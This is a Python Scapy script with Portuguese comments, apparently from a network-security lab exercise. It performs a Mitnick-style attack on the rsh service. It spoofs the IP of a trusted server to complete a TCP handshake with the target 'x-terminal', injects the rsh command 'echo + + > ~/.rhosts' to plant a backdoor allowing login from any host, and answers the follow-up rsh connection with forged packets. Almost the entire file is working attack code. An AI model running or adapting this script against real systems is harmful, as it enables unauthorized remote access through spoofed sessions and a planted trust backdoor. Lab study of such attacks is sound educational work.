from scapy.all import *
import os

myIp = "10.9.0.1"
ipTrustedServer = "10.9.0.6"
ipXTerminal = "10.9.0.5"
xPort = 514
sPort = 1023
syn_ack = False # Variável para verificar se o SYN/ACK foi recebido com sucesso


def send_syn(ip_src, ip_dst):
    # Função para enviar um pacote SYN da origem ip_src para o destino ip_dst na porta port_dst.
    ip = IP(src=ip_src, dst=ip_dst)

    # Cria o TCP com a flag SYN
    tcp = TCP(sport=sPort, dport=xPort, flags="S", seq=778933590)

    # Combina o IP com o TCP
    packet = ip / tcp
    
    # Envia o pacote
    send(packet, verbose=0)


def send_ack(ip_src, ip_dst, seq, ack, window):
    # Função para enviar um pacote ACK da origem ip_src para o destino ip_dst na porta port_dst.
    ip = IP(src=ip_src, dst=ip_dst)

    # Cria o TCP com a flag ACK
    tcp = TCP(sport=sPort, dport=xPort, flags="A", seq=seq, ack=ack, window=window)

    # Combina o IP com o TCP
    packet = ip / tcp

    # Envia o pacote
    send(packet, verbose=False)
    
def send_rsh(ip_src, ip_dst, seq, ack, command, window):
    # Função para enviar um pacote TCP com o comando RSH.
    # Cria o payload do pacote e abre uma conexão RSH com a porta 9090
    rsh_payload = f"9090\x00root\x00root\x00{command}\x00"
    
    ip = IP(src=ip_src, dst=ip_dst)
    
    # Cria o TCP com a flag PA - flag do RSH
    tcp = TCP(sport=sPort, dport=xPort, flags='PA', seq=seq, ack=ack, window=window)
    
    # Combina o IP com o TCP e o payload
    rsh_packet = ip / tcp / rsh_payload
    
    # Envia o pacote
    send(rsh_packet, verbose=False)
    
def send_syn_ack(ip_src, ip_dst, seq, ack, window):
    # Função para enviar um pacote SYN/ACK da origem ip_src para o destino ip_dst na porta port_dst.
    ip = IP(src=ip_src, dst=ip_dst)
    
    # Cria o TCP com a flag SYN/ACK na porta 9090 - porta de resposta do RSH
    tcp = TCP(sport=9090, dport=sPort, flags="SA", seq=seq, ack=ack, window=window)
    
    # Combina o IP com o TCP
    packet = ip / tcp
    
    # Envia o pacote
    send(packet, verbose=False)
    
def send_fin_ack(ip_src, ip_dst, seq, ack, window):
    # Função para enviar um pacote FIN/ACK da origem ip_src para o destino ip_dst na porta port_dst.
    ip = IP(src=ip_src, dst=ip_dst)
    
    # Cria o TCP com a flag FIN/ACK na porta 9090 - porta de resposta do RSH
    tcp = TCP(sport=9090, dport=sPort, flags="FA", seq=seq, ack=ack, window=window)
    
    # Combina o IP com o TCP
    packet = ip / tcp
    
    # Envia o pacote
    send(packet, verbose=False)

def spoof(pkt):
    global syn_ack
    # Função para tratar os pacotes recebidos.
    if(pkt.haslayer(TCP)):
        print(pkt.show())
    
    # Se for um pacote TCP/IP válido
    if IP in pkt and TCP in pkt:
        old_ip = pkt[IP]
        old_tcp = pkt[TCP]
        # Calcula o tamanho do TCP subtraindo do tamanho do IP o tamanho do cabeçalho do IP e o tamanho do cabeçalho do TCP
        tcp_len = old_ip.len - old_ip.ihl * 4 - old_tcp.dataofs * 4
        print(
            "{}:{} -> {}:{} Flags={} Len={}".format(
                old_ip.src, old_tcp.sport, old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len
            )
        )
        
        # Se o pacote for um SYN/ACK para a porta 1023 envia um ACK e um comando RSH (com o IP forjado) logo em seguida com o comando do backdoor
        # Se for SA significa que o servidor confirmou a conexão e está esperando o ACK
        if old_tcp.flags == 'SA' and old_tcp.dport == 1023:
            # Para o loop da main 
            syn_ack = True
            # Envia um ACK de confirmação do SYN/ACK com o ACK da sequência do pacote anterior + 1 
            send_ack(ipTrustedServer, ipXTerminal, old_tcp.ack, old_tcp.seq + 1, old_tcp.window)
            # Envia um comando RSH para o servidor com o comando do backdoor
            send_rsh(ipTrustedServer, ipXTerminal, old_tcp.ack, old_tcp.seq + 1, "echo + + > ~/.rhosts", old_tcp.window)
        
        # Se o pacote for um SYN para a porta 9090 envia um SYN/ACK (com o IP forjado)
        # Se for S para a porta 9090 significa que o x-terminal está tentando se comunicar com a porta 9090 (porta do RSH)
        elif old_tcp.flags == 'S' and old_tcp.dport == 9090:
            send_syn_ack(ipTrustedServer, ipXTerminal, old_tcp.ack, old_tcp.seq + 1, old_tcp.window)
        
        # Se o pacote for um FIN/ACK para a porta 9090 envia um FIN/ACK (com o IP forjado)
        # Se for FA para a porta 9090 significa que o x-terminal está encerrando a conexão com a porta 9090 (porta do RSH)
        elif old_tcp.flags == 'FA' and old_tcp.dport == 9090:
            send_fin_ack(ipTrustedServer, ipXTerminal, old_tcp.ack, old_tcp.seq + 1, old_tcp.window)
            

def getInterface(ip):
    # Função para obter a interface de rede associada a um IP.
    for iface in get_if_list():
        if ip in get_if_addr(iface):
            return iface
    return None
        

if __name__ == "__main__":
    # Fluxo:
    # 1. Desabilita o IP forwarding
    # 2. Envia um pacote SYN para a porta 514 do x-terminal com o IP forjado para iniciar o Three-Way Handshake (até receber um SYN/ACK)
    # 3. Inicia o sniffer para capturar os pacotes recebidos - spoofing de IP
    # 4. Recebe o pacote SYN/ACK e envia um ACK de confirmação e um comando RSH com o comando do backdoor
    # 5. Recebe o pacote SYN para a porta 9090 e envia um SYN/ACK
    # 6. Recebe o pacote FIN/ACK para a porta 9090 e envia um FIN/ACK para encerrar a conexão
    
    # Desabilita o IP forwarding - encaminhamento de pacotes IP para outras interfaces de rede
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    try:
        # Loop para enviar o pacote SYN até receber o SYN/ACK
        while not syn_ack:
            # Inicialmente, envia um pacote SYN para a porta 514 do x-terminal com o IP forjado para iniciar o Three-Way Handshake
            send_syn(ipTrustedServer, ipXTerminal)
            
            # Filtra os pacotes recebidos para o IP do x-terminal
            myFilter = "tcp and host 10.9.0.5"  
            interface=getInterface(myIp) 
            
            # Inicia o sniffer para capturar os pacotes recebidos - spoofing de IP 
            # A função sniff, por padrão, está em modo promíscuo, ou seja, captura todos os pacotes que passam pela interface de rede
            sniff(filter=myFilter, prn=spoof, iface=interface, timeout=3)

    finally:
        # Habilita o IP forwarding
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    